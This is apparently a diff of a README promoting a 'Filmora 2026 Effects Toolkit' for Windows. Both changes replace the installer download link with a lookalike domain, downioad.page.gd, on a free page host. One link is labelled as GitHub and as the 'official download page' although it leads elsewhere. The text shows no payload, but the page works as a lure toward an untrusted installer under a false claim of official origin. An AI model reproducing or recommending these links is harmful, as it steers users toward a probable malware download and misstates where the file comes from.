@@ -2,7 +2,7 @@
 
 Welcome to the Filmora 2026 Effects Toolkit, a comprehensive collection of tools designed to transform your video editing experience on Windows desktop. This toolkit includes a vast array of effects, AI-powered features, and professional templates that integrate seamlessly with Filmora software, enabling you to create stunning videos with ease.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -73,7 +73,7 @@ To ensure optimal performance of the Filmora 2026 Effects Toolkit, your system s
 
 Access the latest version of the toolkit through the link below. This will direct you to the official download page where you can obtain the installer.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## Last Updated
 
